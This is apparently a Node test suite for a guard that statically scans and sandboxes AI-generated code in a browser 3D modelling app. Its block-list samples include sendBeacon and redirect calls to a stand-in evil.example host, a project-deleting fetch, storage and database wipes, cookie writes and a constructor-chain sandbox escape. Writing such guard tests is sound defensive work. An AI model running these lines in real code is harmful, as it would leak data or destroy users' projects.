/**
 * Test Copilot Guard — AI chỉ được thao tác cảnh 3D, không được chạm dự án.
 *   node tests/test_copilot_guard.mjs
 */
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import {
  scanGeneratedCode,
  describeViolations,
  createSandboxScope,
  compileSandboxed,
  stripComments,
  stripStrings
} from '../js/ai/copilot-guard.js';

let passed = 0;
let failed = 0;
async function test(name, fn) {
  try {
    await fn();
    console.log(`  PASS  ${name}`);
    passed += 1;
  } catch (err) {
    console.error(`  FAIL  ${name}\n        ${err.message}`);
    failed += 1;
  }
}

const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;

function run(code, ctx = {}) {
  const scope = createSandboxScope(ctx);
  return compileSandboxed(AsyncFunction, code).call(Object.freeze({}), scope);
}

console.log('\nCopilot Guard suite');

/* ----------------------------- lớp 1: quét tĩnh ---------------------------- */

await test('cho qua code dựng cảnh thông thường', async () => {
  const code = `
    const color = new THREE.Color('#ff0000');
    studio.addCube({ name: 'RedCube', color: '#ff0000' });
    studio.addSphere({ radius: 0.5, position: { x: 1, y: 0.5, z: 0 } });
    const geo = new THREE.BoxGeometry(1, 1, 1);
    const mat = new THREE.MeshStandardMaterial({ color: 0x00ff88, metalness: 0.5 });
    const mesh = new THREE.Mesh(geo, mat);
    mesh.position.set(0, 1, 0);
    scene.add(mesh);
    studio.animate((t) => { mesh.rotation.y = t; });
    studio.tutor.pointAt('#btn-extrude');
    window.THREE.Color;
    console.log('done', mesh.name);
  `;
  const verdict = scanGeneratedCode(code);
  assert.equal(verdict.ok, true, JSON.stringify(verdict.violations));
});

const BLOCKED = [
  ['fetch API', `fetch('/api/cloud/projects', { method: 'DELETE' });`],
  ['localStorage', `localStorage.clear();`],
  ['sessionStorage', `sessionStorage.setItem('x', '1');`],
  ['indexedDB', `indexedDB.deleteDatabase('web-blender-studio');`],
  ['cookieStore', `cookieStore.getAll();`],
  ['WebTransport', `new WebTransport('https://evil.example');`],
  ['MessageChannel', `new MessageChannel();`],
  ['document.body', `document.body.innerHTML = '<h1>hacked</h1>';`],
  ['document.cookie', `document.cookie = 'a=1';`],
  ['window.location', `window.location.href = 'https://evil.example';`],
  ['window.open', `window.open('https://evil.example');`],
  ['navigator', `navigator.sendBeacon('https://evil.example', 'x');`],
  ['eval', `eval('1+1');`],
  ['new Function', `const f = new Function('return fetch');`],
  ['import động', `const m = await import('./x.js');`],
  ['constructor.constructor', `({}).constructor.constructor('return fetch')();`],
  ['URL backend trần', `const u = "/api/agent/exec";`],
  ['WebSocket', `const ws = new WebSocket('ws://127.0.0.1:8082');`],
  ['bridge nội bộ', `studioBridge.send({ action: 'eval' });`]
];

for (const [label, code] of BLOCKED) {
  await test(`chặn ${label}`, () => {
    const verdict = scanGeneratedCode(code);
    assert.equal(verdict.ok, false, `lọt: ${code}`);
    assert.ok(verdict.violations.length > 0);
    assert.ok(describeViolations(verdict.violations).length > 0);
  });
}

await test('không chặn nhầm chuỗi/comment có chữ giống lệnh cấm', () => {
  const code = `
    // Không dùng fetch('/api/x') trong cảnh này.
    /* localStorage là của app, AI không đụng. */
    studio.addText({ text: 'fetch(localStorage)' });
  `;
  assert.equal(scanGeneratedCode(code).ok, true);
  assert.ok(stripComments(code).includes('//') === false);
  assert.ok(!stripStrings(`const a = 'localStorage';`).includes('localStorage'));
});

/* --------------------------- lớp 2: sandbox runtime -------------------------- */

await test('code hợp lệ chạy được và nhận đúng studio/THREE', async () => {
  const calls = [];
  const result = await run(`
    studio.addCube({ name: 'SandboxCube' });
    const v = new THREE.Vector3(1, 2, 3);
    return { name: 'SandboxCube', y: v.y };
  `, {
    studio: { addCube: (opts) => calls.push(opts) },
    THREE: { Vector3: class { constructor(x, y, z) { this.x = x; this.y = y; this.z = z; } } },
    scene: {},
    sceneManager: {},
    camera: {},
    renderer: {},
    OrbitControls: function () {}
  });
  assert.deepEqual(result, { name: 'SandboxCube', y: 2 });
  assert.deepEqual(calls, [{ name: 'SandboxCube' }]);
});

await test('fetch/localStorage/eval không tồn tại trong scope', async () => {
  for (const expr of [
    'fetch("/api/x")',
    'localStorage.clear()',
    'sessionStorage.getItem("a")',
    'indexedDB.deleteDatabase("x")',
    'navigator.sendBeacon("x")',
    'window.location.href',
    'globalThis.fetch',
    'Function("return 1")()',
    'top.location'
  ]) {
    let error = null;
    try {
      await run(`return (${expr});`, { scene: {} });
    } catch (err) {
      error = err;
    }
    assert.ok(error, `${expr} phải lỗi, nhưng chạy được`);
  }

  // document.cookie / document.body: facade không có thuộc tính → undefined, ghi cũng bị bỏ qua.
  const doc = await run(`
    document.cookie = 'a=1';
    return { cookie: document.cookie, body: document.body };
  `);
  assert.equal(doc.cookie, undefined);
  assert.equal(doc.body, undefined);

  // `this` bị buộc về object rỗng, không phải global object.
  assert.equal(await run('return this.fetch;'), undefined);
  assert.equal(await run('return this === globalThis;'), false);
});

await test('parent/top là biến cục bộ vẫn dùng được (không false-positive)', async () => {
  const result = await run(`
    const parent = { child: { value: 42 } };
    const top = 7;
    return parent.child.value + top;
  `, { scene: {} });
  assert.equal(result, 49);
});

await test('window/document facade chỉ đọc: không sửa được UI', async () => {
  const result = await run(`
    const created = document.createElement('div');
    const missing = document.getElementById('viewport-canvas-host');
    const props = Object.keys(window);
    return { createdType: typeof created, missing, props };
  `, { scene: {}, studio: {} });
  assert.equal(result.createdType, 'object', 'createElement giữ nguyên kiểu trả về null');
  assert.equal(result.missing, null);
  assert.ok(!result.props.includes('location'));
  assert.ok(!result.props.includes('localStorage'));
  assert.ok(result.props.includes('THREE'));
});

await test('Worker document/renderer facade không trả object trình duyệt thật', async () => {
  const source = readFileSync(new URL('../js/ai/copilot-exec-worker.js', import.meta.url), 'utf8');
  assert.ok(source.includes('domElement: null'), 'Worker renderer phải không chứa live DOM');
  assert.ok(source.includes('createElement: () => null'), 'Worker document phải không tạo DOM thật');
  assert.ok(!source.includes('ownerDocument'), 'Worker facade không được mở đường ownerDocument');
});

await test('sandbox cấp print/editMode/modifiers/bpy an toàn (không kích hoạt browser window.print)', async () => {
  const printed = [];
  let edited = 0;
  let modded = 0;
  const out = await run(`
    print("hello", 123);
    window.print("world");
    window.editMode.enter({ id: 1 });
    modifiers.applyModifier({ isMesh: true }, 'bevel', {});
    Modifiers.applyModifier({ isMesh: true }, 'array', {});
    return bpy?.version || 'ok';
  `, {
    scene: {},
    print: (...args) => printed.push(args.join(' ')),
    editMode: { enter: () => { edited += 1; } },
    modifiers: { applyModifier: () => { modded += 1; } },
    bpy: { version: '4.x' }
  });
  assert.deepEqual(printed, ['hello 123', 'world']);
  assert.equal(edited, 1);
  assert.equal(modded, 2);
  assert.equal(out, '4.x');
});

/* ------------------------- lớp 3: tích hợp ai-copilot ----------------------- */

await test('ai-copilot quét tĩnh và chuyển thực thi sang Worker cách ly', async () => {
  const src = readFileSync(new URL('../js/ai/ai-copilot.js', import.meta.url), 'utf8');
  const runtime = readFileSync(new URL('../js/ai/copilot-runtime.js', import.meta.url), 'utf8');
  const worker = readFileSync(new URL('../js/ai/copilot-exec-worker.js', import.meta.url), 'utf8');
  const stem = readFileSync(new URL('../js/ui/stem-tutor-ui.js', import.meta.url), 'utf8');
  assert.ok(src.includes("from './copilot-guard.js'"), 'thiếu import guard');
  assert.ok(src.includes('scanGeneratedCode(cleanCode)'), 'thiếu quét tĩnh');
  assert.ok(src.includes("from './copilot-runtime.js'"), 'thiếu runtime Worker');
  assert.ok(!src.includes('createSandboxScope('), 'vẫn còn scope same-realm');
  assert.ok(!src.includes('compileSandboxed('), 'vẫn còn compiler same-realm');
  assert.ok(!src.includes('AsyncFunction'), 'vẫn còn AsyncFunction cùng realm');
  assert.ok(runtime.includes("new Worker(new URL('./copilot-exec-worker.js', import.meta.url)"), 'runtime chưa tạo Worker module');
  assert.ok(worker.includes('workerLoaderDocument(initial)'), 'Worker chưa dựng scene mirror từ payload');
  assert.ok(stem.includes("from '../ai/copilot-runtime.js'"), 'STEM chưa dùng runtime Worker');
  const demoStart = stem.indexOf('async _runSandboxedDemoCode');
  const demoEnd = stem.indexOf('\n  setVoiceRate(', demoStart);
  const demoRunner = stem.slice(demoStart, demoEnd);
  assert.ok(demoStart >= 0 && demoEnd > demoStart, 'không xác định được demo runner STEM');
  assert.ok(demoRunner.includes('new CopilotRuntime('), 'demo runner STEM chưa dùng Worker runtime');
  assert.ok(!demoRunner.includes('AsyncFunction'), 'demo runner STEM vẫn có fallback same-realm');
});

await test('app.js nạp ShareDialog lazy (không còn import tĩnh)', async () => {
  const src = readFileSync(new URL('../js/app.js', import.meta.url), 'utf8');
  assert.ok(!/^import\s*\{[^}]*ShareDialog[^}]*\}\s*from\s*'\.\/ui\/share-dialog\.js';/m.test(src),
    'ShareDialog vẫn import tĩnh');
  assert.ok(src.includes('_ensureShareDialog('), 'thiếu _ensureShareDialog');
  assert.ok(src.includes("await import('./ui/share-dialog.js')"), 'thiếu dynamic import');
});

console.log(`\nSummary: ${passed} passed, ${failed} failed`);
if (failed > 0) process.exit(1);
